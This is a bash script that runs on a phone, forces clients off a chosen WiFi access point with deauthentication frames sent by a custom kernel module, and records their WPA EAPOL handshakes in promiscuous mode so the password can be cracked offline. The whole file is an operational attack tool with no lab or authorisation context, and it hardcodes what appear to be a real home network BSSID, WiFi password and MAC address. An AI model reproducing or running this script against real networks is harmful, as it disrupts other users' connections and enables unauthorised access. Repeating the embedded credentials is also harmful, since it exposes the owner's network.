#!/bin/bash
# promisc_grab.sh - Zero-switch handshake grab via promisc mode
# Runs on PHONE. Stays in STA mode, uses promisc to capture other clients' EAPOL
# Args: BSSID SSID FREQ ROUNDS WAIT_SEC
set -o pipefail

BSSID="$1"
SSID="$2"
FREQ="$3"
ROUNDS="${4:-10}"
WAIT_SEC="${5:-20}"
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:1F"
HOME_PSK="9006609b29404a"
BSSID_LOWER=$(echo "$BSSID" | tr 'A-F' 'a-f')
OUR_MAC="5c:17:cf:bc:a4:e3"

echo "============================================"
echo " Promisc Grab: $SSID ($BSSID) ${FREQ}MHz"
echo " Rounds: $ROUNDS  Wait: ${WAIT_SEC}s"
echo "============================================"

wait_wlan0() {
    for i in $(seq 1 100); do [ -e /sys/class/net/wlan0 ] && return 0; sleep 0.05; done; return 1
}

cleanup() {
    echo "[*] Cleaning up..."
    killall wpa_supplicant tcpdump 2>/dev/null
    ip link set wlan0 promisc off 2>/dev/null
    rmmod wlan 2>/dev/null; sleep 2
    insmod "$DRIVER" 2>/dev/null; wait_wlan0 && sleep 3
    systemctl start NetworkManager 2>/dev/null; sleep 2
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    echo "[*] WiFi restored."
}
trap cleanup EXIT

cat > /tmp/wpa_promisc.conf << WPAEOF
ctrl_interface=/tmp/wpa_ctrl
network={
    ssid="$SSID"
    bssid=$BSSID
    psk="dummypassword1234567890123456"
    key_mgmt=WPA-PSK
    scan_freq=$FREQ
}
WPAEOF

PCAP="/tmp/promisc_grab_${BSSID_LOWER//:/}.pcap"
rm -f "$PCAP"

systemctl stop NetworkManager 2>/dev/null
killall wpa_supplicant tcpdump 2>/dev/null; sleep 0.3
rmmod wlan 2>/dev/null; sleep 0.5
insmod "$DRIVER"
wait_wlan0 || { echo "[!] wlan0 not found"; exit 1; }
sleep 2
ip link set wlan0 up; sleep 0.5

# Enable promisc mode
ip link set wlan0 promisc on
echo "[*] Promisc mode ON"

# Start continuous capture
tcpdump -i wlan0 -w "$PCAP" 2>/dev/null &
TCPID=$!

HANDSHAKE_FOUND=0
for round in $(seq 1 "$ROUNDS"); do
    echo ""
    echo "--- Round $round/$ROUNDS ---"

    # Connect to target (creates PE session for deauth)
    rm -rf /tmp/wpa_ctrl; mkdir -p /tmp/wpa_ctrl
    dmesg -C
    killall wpa_supplicant 2>/dev/null; sleep 0.2
    wpa_supplicant -i wlan0 -c /tmp/wpa_promisc.conf -B -D nl80211 2>/dev/null

    # Wait for PE session
    PE=0
    for w in $(seq 1 200); do
        dmesg | tail -30 | grep -q "Connecting to" && { PE=1; break; }; sleep 0.02
    done
    [ "$PE" -eq 0 ] && { echo "  no PE"; continue; }

    # Wait TX power
    for tp in $(seq 1 50); do
        TXPWR=$(iw dev wlan0 info 2>/dev/null | grep txpower | awk '{print $2}')
        [ -n "$TXPWR" ] && [ "$TXPWR" != "0.00" ] && break; sleep 0.1
    done
    echo -n "  txp=${TXPWR} "

    # Fire deauths (3 quick rounds with 200ms between)
    DEAUTH_OK=0
    for f in $(seq 1 3); do
        dmesg -C; insmod /tmp/petx11.ko 2>/dev/null
        dmesg | grep -q "Deauth TX" && DEAUTH_OK=$((DEAUTH_OK + 1))
        sleep 0.2
    done
    echo -n "deauth=${DEAUTH_OK}/3 "

    # Wait for clients to reconnect (capture is already running!)
    echo "waiting ${WAIT_SEC}s..."
    sleep "$WAIT_SEC"

    # Check for EAPOL from OTHER stations (not our MAC)
    if [ -f "$PCAP" ] && [ "$(stat -c%s "$PCAP" 2>/dev/null)" -gt 24 ]; then
        # Count all EAPOL
        ALL_EAPOL=$(tcpdump -r "$PCAP" -nn 2>/dev/null | grep -ic "EAPOL\|802.1X" || true)
        ALL_EAPOL=$(echo "$ALL_EAPOL" | tr -d '[:space:]'); [ -z "$ALL_EAPOL" ] && ALL_EAPOL=0
        # Count EAPOL from other stations (exclude our MAC)
        OTHER_EAPOL=$(tcpdump -r "$PCAP" -nn -e 2>/dev/null | grep -i "EAPOL\|802.1X" | grep -v "$OUR_MAC" | wc -l || true)
        OTHER_EAPOL=$(echo "$OTHER_EAPOL" | tr -d '[:space:]'); [ -z "$OTHER_EAPOL" ] && OTHER_EAPOL=0
        FSIZE=$(stat -c%s "$PCAP" 2>/dev/null)
        echo "  EAPOL: total=$ALL_EAPOL other=$OTHER_EAPOL (${FSIZE}B)"

        if [ "$OTHER_EAPOL" -gt 0 ]; then
            echo "  [!!!] EAPOL from OTHER station!"
            HANDSHAKE_FOUND=1
            cp "$PCAP" "/tmp/handshake_promisc_${BSSID_LOWER//:/}.pcap"
            # Show the other EAPOL frames
            tcpdump -r "$PCAP" -nn -e 2>/dev/null | grep -i "EAPOL\|802.1X" | grep -v "$OUR_MAC" | head -10
            break
        fi
    fi
done

kill $TCPID 2>/dev/null; wait $TCPID 2>/dev/null

echo ""
if [ "$HANDSHAKE_FOUND" -eq 1 ]; then
    echo "SUCCESS: /tmp/handshake_promisc_${BSSID_LOWER//:/}.pcap"
else
    # Show what EAPOL we DID capture
    if [ -f "$PCAP" ] && [ "$(stat -c%s "$PCAP" 2>/dev/null)" -gt 24 ]; then
        echo "All EAPOL captured:"
        tcpdump -r "$PCAP" -nn -e 2>/dev/null | grep -i "EAPOL\|802.1X" | head -20
    fi
    echo "No OTHER-station handshake captured"
fi
exit $((1 - HANDSHAKE_FOUND))
